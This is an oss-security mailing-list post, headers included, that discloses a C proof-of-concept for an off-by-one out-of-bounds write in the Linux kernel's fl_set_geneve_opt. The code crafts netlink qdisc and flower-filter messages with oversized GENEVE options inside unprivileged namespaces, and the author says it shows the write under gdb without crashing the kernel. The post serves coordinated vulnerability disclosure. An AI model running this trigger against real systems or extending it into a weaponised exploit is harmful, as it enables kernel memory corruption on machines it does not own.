Received: (qmail 25738 invoked by uid 550); 12 Jun 2023 09:23:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5444 invoked from network); 12 Jun 2023 02:06:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20221208; t=1686535581; x=1689127581;
        h=content-transfer-encoding:in-reply-to:content-language:references
         :to:from:subject:user-agent:mime-version:date:message-id:from:to:cc
         :subject:date:message-id:reply-to;
        bh=TQ8J+VjBAVwp0oqGxNZqyBLpdjYjhaf7Dwe4qTesYv8=;
        b=QTquTEFXW0IoU7FyZfm95JC6FW7LOk3/yfwCShyoyUoRXd1MaETSBR/zTzrqUVcq91
         QEsU0sl+gInZR7TzQlkMlr43jUbTb6TQQheEWMtvPAL6i3c2aGEamz+GsJzsOaUG4FBb
         Z04nr0BaW+U9XC8Alj4QInccTaUQkZ07r4oosaiZK7+pLh9yTrNuedpcZa9TMa7u451s
         R/tyzx4nbFLr3hYNnKDvXxUtNPGNveEmpIupU1K6+QDwNrjlvIw0wH6Oz6am/i8fMCjh
         px33z1IFwV/1ZqMYsinQfCOHA8OH4kMHDgTRdDCv53Fp1AUTyFun2DIjIKikSQU8Qrwi
         Saew==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20221208; t=1686535581; x=1689127581;
        h=content-transfer-encoding:in-reply-to:content-language:references
         :to:from:subject:user-agent:mime-version:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=TQ8J+VjBAVwp0oqGxNZqyBLpdjYjhaf7Dwe4qTesYv8=;
        b=Clw3d/2R1FHXX6Euc9DS0b3YAabxLwQZV1+Mmf6rxnJQuSyV66tLkyTyo/4Z0Rihny
         R0t0V1kBfL/RZrQh7K8qBjIFz45o5I4zd9jyvMj/x54zdsk4kttwYxjTp3mmXq2DZjXR
         ghf7/7is1hSVnz/R5y1YDvgRkJpZYpPmXN/IjIlZ5pe+0+yQUNeMkNhrg03YFj6+LBc1
         CX6KghiiBcelrQaqH0xkB0vWh599mePIdyfG1iB9/PDOw3y544qFgc5nX0WVS1v1IIe6
         e19z6C3X7kal23HlADZQUqjv7YnyuOnN68wQxDKljoSL3k7032nSZ5CwYPAxtlH9T0+B
         CzlA==
X-Gm-Message-State: AC+VfDzF/lj3zlVaS7VNg3W2LL5hNYU0nzrggYuZviwZhzvyZGTtwzha
	1iHXR/9Ckvb1cCWEK3VyoGvdkaR8NVUebXXW
X-Google-Smtp-Source: ACHHUZ6ayC1xxL60wD56qepzURDQjtjgotLktDvIMUk1OIYdhOHF9poZyFd5W3M7AZW0fjaTXX/mqQ==
X-Received: by 2002:a05:6a20:4426:b0:111:a0e5:d2b7 with SMTP id ce38-20020a056a20442600b00111a0e5d2b7mr9486340pzb.4.1686535580306;
        Sun, 11 Jun 2023 19:06:20 -0700 (PDT)
Message-ID: <4bb12dda-68b6-db9a-4e36-a926eadcf738@gmail.com>
Date: Mon, 12 Jun 2023 10:06:15 +0800
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
 Thunderbird/102.11.0
From: Hangyu Hua <hbh25y@gmail.com>
To: oss-security@lists.openwall.com
References: <ee226490-51c6-f8e9-821a-6061202c01b1@gmail.com>
 <e93b159a-f165-8ab6-e9ea-ab636c26b9ef@gmail.com>
 <11dc9c61-7833-5503-75e6-f4ec78a60701@gmail.com>
Content-Language: en-US
In-Reply-To: <11dc9c61-7833-5503-75e6-f4ec78a60701@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: Re: [oss-security] Linux kernel: off-by-one in fl_set_geneve_opt

Hi guys,

Here is the poc of this bug.

This poc can't crash the kernel. But you can clearly see the oob write 
through gdb.

The poc code I tested on 6.4-rc3 is as follows:

#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <linux/netlink.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_cls.h>

int qdist_create(int fd)
{
         char *start = malloc(0x1000);
         struct nlmsghdr *nlh = (struct nlmsghdr *)start;

         memset(start, 0, 0x1000);
         printf("In qdist_create()\n");
         // tcm
         struct tcmsg *tcm;
         tcm = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
         tcm->tcm_ifindex = 1;
         tcm->tcm_family = AF_UNSPEC;
         tcm->tcm_parent = TC_H_ROOT;
         u_int32_t prio = 1;
         u_int32_t protocol = 1;
         tcm->tcm_info = TC_H_MAKE(prio << 16, protocol);
         nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));

         // TCA_KIND
         struct nlattr *nla = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         char kind_data[4] = "sfq";
         nla->nla_type = TCA_KIND;
         nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(kind_data));
         memcpy((char *)nla + NLA_HDRLEN, kind_data, sizeof(kind_data));
         nlh->nlmsg_len = nlh->nlmsg_len + nla->nla_len;

         struct iovec iov = {
                 .iov_base = nlh,
                 .iov_len = nlh->nlmsg_len
         };
         struct sockaddr_nl nladdr = {
                 .nl_family = AF_NETLINK
         };
         struct msghdr msg = {
                 .msg_name = &nladdr,
                 .msg_namelen = sizeof(nladdr),
                 .msg_iov = &iov,
                 .msg_iovlen = 1
         };

         nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
         nlh->nlmsg_type = RTM_NEWQDISC;


         if (sendmsg(fd, &msg, 0) < 0) {
                 printf("qdist fail");
                 return -1;
         }
         printf("qdist_create() over\n");
         return 0;
}

int filter_create(int fd)
{
         char *start = malloc(0x2000);
         struct nlmsghdr *nlh = (struct nlmsghdr *)start;

         memset(start, 0, 0x2000);
         printf("In filter_create()\n");
         // tcm
         struct tcmsg *tcm = (struct tcmsg *)(start + sizeof(struct 
nlmsghdr));
         tcm->tcm_ifindex = 1;
         tcm->tcm_family = AF_UNSPEC;
         u_int32_t prio = 1;
         u_int32_t protocol = 1;
         tcm->tcm_info = TC_H_MAKE(prio << 16, protocol);
         nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));

         // TCA_KIND
         struct nlattr *nla = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         char kind_data[7] = "flower";
         nla->nla_type = TCA_KIND;
         nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(kind_data));
         memcpy((char *)nla + NLA_HDRLEN, kind_data, sizeof(kind_data));
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + nla->nla_len;

         // TCA_OPTIONS start
         nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         nla->nla_type = TCA_OPTIONS;
         nla->nla_len = NLA_HDRLEN;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + nla->nla_len;

         struct nlattr *opt_nla = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         opt_nla->nla_type = TCA_FLOWER_KEY_ENC_OPTS;
         opt_nla->nla_len = NLA_HDRLEN;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + opt_nla->nla_len;

         // 1
         struct nlattr *gen_nla = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         gen_nla->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
         gen_nla->nla_len = NLA_HDRLEN;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla->nla_len;

         struct nlattr *data_nla = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         char gen_data_1[124];
         for (int i = 0; i < 124; i++) {
                 gen_data_1[i] = 'A';
         }
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_1));
         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_1, 
sizeof(gen_data_1));
         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         u_int16_t *gen_class = (u_int16_t *)((char *) data_nla + 
NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
         *gen_class = 1;
         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         u_int8_t *gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
         *gen_type = 1;
         gen_nla->nla_len = NLA_ALIGN(gen_nla->nla_len) + data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         // 2
         struct nlattr *gen_nla_2 = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         gen_nla_2->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
         gen_nla_2->nla_len = NLA_HDRLEN;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla_2->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         char gen_data_2[120];
         for (int i = 0; i < 120; i++) {
                 gen_data_2[i] = 'A';
         }
         data_nla->nla_type =    TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
         data_nla->nla_len =     NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_2));
         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_2, 
sizeof(gen_data_2));
         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         gen_class = (u_int16_t *)((char *) data_nla + NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
         *gen_class = 1;
         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
         *gen_type = 1;
         gen_nla_2->nla_len = NLA_ALIGN(gen_nla_2->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         // 3
         struct nlattr *gen_nla_3 = (struct nlattr *)(start +
NLMSG_ALIGN(nlh->nlmsg_len));
         gen_nla_3->nla_type = TCA_FLOWER_KEY_ENC_OPTS_GENEVE;
         gen_nla_3->nla_len = NLA_HDRLEN;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + gen_nla_3->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         char gen_data_3[120];
         for (int i = 0; i < 120; i++) {
                 gen_data_3[i] = 'B';
         }
         data_nla->nla_type =    TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA;
         data_nla->nla_len =     NLA_ALIGN(NLA_HDRLEN + sizeof(gen_data_3));
         memcpy((char *)data_nla + NLA_HDRLEN, gen_data_3, 
sizeof(gen_data_3));
         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         gen_class = (u_int16_t *)((char *) data_nla + NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int16_t));
         *gen_class = 1;
         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         data_nla = (struct nlattr *)(start + NLMSG_ALIGN(nlh->nlmsg_len));
         gen_type = (u_int8_t *)((char *) data_nla + NLA_HDRLEN);
         data_nla->nla_type = TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE;
         data_nla->nla_len = NLA_ALIGN(NLA_HDRLEN + sizeof(u_int8_t));
         *gen_type = 1;
         gen_nla_3->nla_len = NLA_ALIGN(gen_nla_3->nla_len) + 
data_nla->nla_len;
         nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + data_nla->nla_len;

         opt_nla->nla_len = NLA_ALIGN(opt_nla->nla_len) + gen_nla->nla_len +
gen_nla_2->nla_len + gen_nla_3->nla_len;
         nla->nla_len = NLA_ALIGN(nla->nla_len) + opt_nla->nla_len;
         // TCA_OPTIONS end

         struct iovec iov = {
                 .iov_base = nlh,
                 .iov_len = nlh->nlmsg_len
         };
         struct sockaddr_nl nladdr = {
                 .nl_family = AF_NETLINK
         };
         struct msghdr msg = {
                 .msg_name = &nladdr,
                 .msg_namelen = sizeof(nladdr),
                 .msg_iov = &iov,
                 .msg_iovlen = 1
         };

         nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
         nlh->nlmsg_type = RTM_NEWTFILTER;

         if (sendmsg(fd, &msg, 0) < 0) {
                 printf("filter create");
         }
         printf("filter_create over\n");
         return 0;
}

int main()
{
         int socket_fd;

         unshare(CLONE_NEWUSER|CLONE_NEWNET);
         socket_fd = socket(PF_NETLINK, SOCK_RAW, 0);
         if (socket_fd > 0) {
                 printf("%d\n", socket_fd);
         } else {
                 printf("socket create:");
                 return -1;
         }

         qdist_create(socket_fd);
         filter_create(socket_fd);

}

Thanks,
Hangyu
